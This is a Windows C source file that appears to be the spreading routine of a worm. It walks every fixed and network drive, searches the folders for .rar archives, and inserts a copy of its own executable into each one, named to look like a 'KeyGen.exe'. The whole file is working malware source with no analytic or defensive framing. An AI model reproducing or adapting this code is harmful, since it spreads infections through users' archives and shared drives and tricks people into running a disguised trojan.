#include "stdafx.h"
#include "../h/includes.h"
#include "filenamez.h"
char wp[MAX_PATH];
void rndfilename(char *dst)
{
	srand(GetTickCount());
	wsprintf(dst,"%s",filenamez[rand()%(sizeof(filenamez) / sizeof(char *))]);
}
void injectrar()
{
	WIN32_FIND_DATA wfd;
	HANDLE hfind;
	char fullpath[MAX_PATH];
	LPTSTR xaddr=NULL;
	char xRandomString[30];
	hfind=FindFirstFile("*.*",&wfd);

	if(hfind!=INVALID_HANDLE_VALUE)
	{
	do
	{
	if(wfd.cFileName[0]!='.')
	{
	wfd.dwFileAttributes&=FILE_ATTRIBUTE_DIRECTORY;
	if(wfd.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY) 
	{
	if(SetCurrentDirectory(wfd.cFileName)==TRUE)
	{
	injectrar();
	SetCurrentDirectory("..");
	}
	}
	else
	{
	if(GetFullPathName(wfd.cFileName,MAX_PATH,fullpath,&xaddr)!=0)
	{
	CharLower(fullpath);
	if(memcmp(fullpath+lstrlen(fullpath)-3,"rar",3)==0)
	{
	Sleep(5000);
	rndfilename(xRandomString);
	lstrcat(xRandomString,"KeyGen.exe");
	AddToRar(fullpath,wp,xRandomString,FILE_ATTRIBUTE_NORMAL);
	}
	}
	}
	}
	}while(FindNextFile(hfind,&wfd));
	FindClose(hfind);
	}
}

DWORD WINAPI infectrar(LPVOID xvoid)
{
    char Drive[]="z:\\";
    UINT drive_type;
    if(GetModuleFileName(NULL,wp,MAX_PATH)==0)
    ExitThread(0);
    do
	{
    drive_type=GetDriveType(Drive);	
    if(drive_type==DRIVE_FIXED || drive_type==DRIVE_REMOTE)
	{
    if(SetCurrentDirectory(Drive)==TRUE)
    injectrar();	
	}
    Drive[0]--;
	}while(Drive[0]!='b');
    return 1;
}
